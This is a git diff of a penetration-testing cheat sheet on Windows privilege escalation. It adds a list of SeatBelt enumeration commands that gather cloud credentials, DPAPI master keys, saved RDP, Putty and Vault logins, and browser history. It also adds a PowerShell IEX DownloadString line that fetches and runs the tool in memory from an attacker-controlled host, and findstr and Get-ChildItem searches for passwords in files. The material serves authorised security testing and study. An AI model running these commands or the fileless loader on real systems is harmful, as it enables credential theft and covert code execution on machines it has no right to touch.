@@ -315,8 +315,120 @@ connections files and putty SSH host keys, AWS/Google/Azure cloud credential
 files, browsers bookmarks and histories, etc.   
 
 ```
+# Currently available (last update 20210511) SeatBelt commands  (+ means remote usage is supported):
+    + AMSIProviders          - Providers registered for AMSI
+    + AntiVirus              - Registered antivirus (via WMI)
+    + AppLocker              - AppLocker settings, if installed
+      ARPTable               - Lists the current ARP table and adapter information (equivalent to arp -a)
+      AuditPolicies          - Enumerates classic and advanced audit policy settings
+    + AuditPolicyRegistry    - Audit settings via the registry
+    + AutoRuns               - Auto run executables/scripts/programs
+    + ChromiumBookmarks      - Parses any found Chrome/Edge/Brave/Opera bookmark files
+    + ChromiumHistory        - Parses any found Chrome/Edge/Brave/Opera history files
+    + ChromiumPresence       - Checks if interesting Chrome/Edge/Brave/Opera files exist
+    + CloudCredentials       - AWS/Google/Azure/Bluemix cloud credential files
+    + CloudSyncProviders     - All configured Office 365 endpoints (tenants and teamsites) which are synchronised by OneDrive.
+      CredEnum               - Enumerates the current user's saved credentials using CredEnumerate()
+    + CredGuard              - CredentialGuard configuration
+      dir                    - Lists files/folders. By default, lists users' downloads, documents, and desktop folders (arguments == [directory] [depth] [regex] [boolIgnoreErrors]
+    + DNSCache               - DNS cache entries (via WMI)
+    + DotNet                 - DotNet versions
+    + DpapiMasterKeys        - List DPAPI master keys
+      EnvironmentPath        - Current environment %PATH$ folders and SDDL information
+    + EnvironmentVariables   - Current environment variables
+    + ExplicitLogonEvents    - Explicit Logon events (Event ID 4648) from the security event log. Default of 7 days, argument == last X days.
+      ExplorerMRUs           - Explorer most recently used files (last 7 days, argument == last X days)
+    + ExplorerRunCommands    - Recent Explorer "run" commands
+      FileInfo               - Information about a file (version information, timestamps, basic PE info, etc. argument(s) == file path(s)
+    + FileZilla              - FileZilla configuration files
+    + FirefoxHistory         - Parses any found FireFox history files
+    + FirefoxPresence        - Checks if interesting Firefox files exist
+    + Hotfixes               - Installed hotfixes (via WMI)
+      IdleTime               - Returns the number of seconds since the current user's last input.
+    + IEFavorites            - Internet Explorer favorites
+      IETabs                 - Open Internet Explorer tabs
+    + IEUrls                 - Internet Explorer typed URLs (last 7 days, argument == last X days)
+    + InstalledProducts      - Installed products via the registry
+      InterestingFiles       - "Interesting" files matching various patterns in the user's folder. Note: takes non-trivial time.
+    + InterestingProcesses   - "Interesting" processes - defensive products and admin tools
+      InternetSettings       - Internet settings including proxy configs and zones configuration
+      KeePass                - Finds KeePass configuration files
+    + LAPS                   - LAPS settings, if installed
+    + LastShutdown           - Returns the DateTime of the last system shutdown (via the registry).
+      LocalGPOs              - Local Group Policy settings applied to the machine/local users
+    + LocalGroups            - Non-empty local groups, "-full" displays all groups (argument == computername to enumerate)
+    + LocalUsers             - Local users, whether they're active/disabled, and pwd last set (argument == computername to enumerate)
+    + LogonEvents            - Logon events (Event ID 4624) from the security event log. Default of 10 days, argument == last X days.
+    + LogonSessions          - Windows logon sessions
+      LOLBAS                 - Locates Living Off The Land Binaries and Scripts (LOLBAS) on the system. Note: takes non-trivial time.
+    + LSASettings            - LSA settings (including auth packages)
+    + MappedDrives           - Users' mapped drives (via WMI)
+      McAfeeConfigs          - Finds McAfee configuration files
+      McAfeeSiteList         - Decrypt any found McAfee SiteList.xml configuration files.
+      MicrosoftUpdates       - All Microsoft updates (via COM)
+      NamedPipes             - Named pipe names and any readable ACL information.
+    + NetworkProfiles        - Windows network profiles
+    + NetworkShares          - Network shares exposed by the machine (via WMI)
+    + NTLMSettings           - NTLM authentication settings
+      OfficeMRUs             - Office most recently used file list (last 7 days)
+      OracleSQLDeveloper     - Finds Oracle SQLDeveloper connections.xml files
+    + OSInfo                 - Basic OS info (i.e. architecture, OS version, etc.)
+    + OutlookDownloads       - List files downloaded by Outlook
+    + PoweredOnEvents        - Reboot and sleep schedule based on the System event log EIDs 1, 12, 13, 42, and 6008. Default of 7 days, argument == last X days.
+    + PowerShell             - PowerShell versions and security settings
+    + PowerShellEvents       - PowerShell script block logs (4104) with sensitive data.
+    + PowerShellHistory      - Searches PowerShell console history files for sensitive regex matches.
+      Printers               - Installed Printers (via WMI)
+    + ProcessCreationEvents  - Process creation logs (4688) with sensitive data.
+      Processes              - Running processes with file info company names that don't contain 'Microsoft', "-full" enumerates all processes
+    + ProcessOwners          - Running non-session 0 process list with owners. For remote use.
+    + PSSessionSettings      - Enumerates PS Session Settings from the registry
+    + PuttyHostKeys          - Saved Putty SSH host keys
+    + PuttySessions          - Saved Putty configuration (interesting fields) and SSH host keys
+      RDCManFiles            - Windows Remote Desktop Connection Manager settings files
+    + RDPSavedConnections    - Saved RDP connections stored in the registry
+    + RDPSessions            - Current incoming RDP sessions (argument == computername to enumerate)
+    + RDPsettings            - Remote Desktop Server/Client Settings
+      RecycleBin             - Items in the Recycle Bin deleted in the last 30 days - only works from a user context!
+      reg                    - Registry key values (HKLM\Software by default) argument == [Path] [intDepth] [Regex] [boolIgnoreErrors]
+      RPCMappedEndpoints     - Current RPC endpoints mapped
+    + SCCM                   - System Center Configuration Manager (SCCM) settings, if applicable
+    + ScheduledTasks         - Scheduled tasks (via WMI) that aren't authored by 'Microsoft', "-full" dumps all Scheduled tasks
+      SearchIndex            - Query results from the Windows Search Index, default term of 'passsword'. (argument(s) == <search path> <pattern1,pattern2,...>
+      SecPackageCreds        - Obtains credentials from security packages
+      SecurityPackages       - Enumerates the security packages currently available using EnumerateSecurityPackagesA()
+      Services               - Services with file info company names that don't contain 'Microsoft', "-full" dumps all processes
+    + SlackDownloads         - Parses any found 'slack-downloads' files
+    + SlackPresence          - Checks if interesting Slack files exist
+    + SlackWorkspaces        - Parses any found 'slack-workspaces' files
+    + SuperPutty             - SuperPutty configuration files
+    + Sysmon                 - Sysmon configuration from the registry
+    + SysmonEvents           - Sysmon process creation logs (1) with sensitive data.
+      TcpConnections         - Current TCP connections and their associated processes and services
+      TokenGroups            - The current token's local and domain groups
+      TokenPrivileges        - Currently enabled token privileges (e.g. SeDebugPrivilege/etc.)
+    + UAC                    - UAC system policies via the registry
+      UdpConnections         - Current UDP connections and associated processes and services
+      UserRightAssignments   - Configured User Right Assignments (e.g. SeDenyNetworkLogonRight, SeShutdownPrivilege, etc.) argument == computername to enumerate
+    + WindowsAutoLogon       - Registry autologon information
+      WindowsCredentialFiles - Windows credential DPAPI blobs
+    + WindowsDefender        - Windows Defender settings (including exclusion locations)
+    + WindowsEventForwarding - Windows Event Forwarding (WEF) settings via the registry
+    + WindowsFirewall        - Non-standard firewall rules, "-full" dumps all (arguments == allow/deny/tcp/udp/in/out/domain/private/public)
+      WindowsVault           - Credentials saved in the Windows Vault (i.e. logins from Internet Explorer and Edge).
+      WMIEventConsumer       - Lists WMI Event Consumers
+      WMIEventFilter         - Lists WMI Event Filters
+      WMIFilterBinding       - Lists WMI Filter to Consumer Bindings
+    + WSUS                   - Windows Server Update Services (WSUS) settings, if applicable
+
 # Conduct system + user checks, with fully detailed results
-SeatBelt.exe all full
+SeatBelt.exe <Command> [Command2] [-full]
+SeatBelt.exe -group=all [-full]
+
+# Executes SeatBelt from memory (as a gzip-compressed and base64-encoded .Net assembly loaded in PowerShell).
+# From PowerSharpBinaries https://github.com/S3cur3Th1sSh1t/PowerSharpPack/
+IEX(New-Object Net.WebClient).DownloadString("http://<HOSTNAME | IP>[:<PORT>]/<SCRIPT>")
+Invoke-Seatbelt -Command "<Command> [Command2] [-full]"
 ```
 
 ### Physical access privileges escalation
@@ -414,18 +526,15 @@ dir /s <KEYWORD>
 search -f <FILE_NAME>.<FILE_EXTENSION> <KEYWORD>
 search -f *.* <KEYWORD>
 
-# Search 'password' / 'pass' in all txt/xml/ini files
-findstr /si "password" *.txt
-findstr /si "password" *.xml
-findstr /si "password" *.ini
-findstr /si "pass" *.txt
-findstr /si "pass" *.xml
-findstr /si "pass" *.ini
+# Search (case insensitive) the specified keyword (for example 'password' or 'pass') in all or all the files of a given extension.
+# The findstr is a Windows utility usable in a DOS shell. Get-ChildItem is a (faster) PowerShell cmdlet.
+# A case sensitive search can be conducted using 's findstr /spin option or Get-Select-String's -CaseSensitive switch.
 
-# Search 'password'/'pass' in all files
-findstr /spin "password" *.*
-findstr /spin "pass" *.*
-findstr /spin "savecred" *.*
+Get-ChildItem -ErrorAction SilentlyContinue -Recurse | Select-String "<KEYWORD>" -List | Select-Object -ExpandProperty Path
+findstr /si "<KEYWORD>" *.*
+
+Get-ChildItem -ErrorAction SilentlyContinue -Recurse -Filter <*.txt | *.<EXTENSION>> | Select-String "<KEYWORD>" -List | Select-Object -ExpandProperty Path
+findstr /si "<KEYWORD>" <*.txt | *.<EXTENSION>>
 
 # Search for runas with savecred in files
 findstr /s /i /m "savecred" *.*
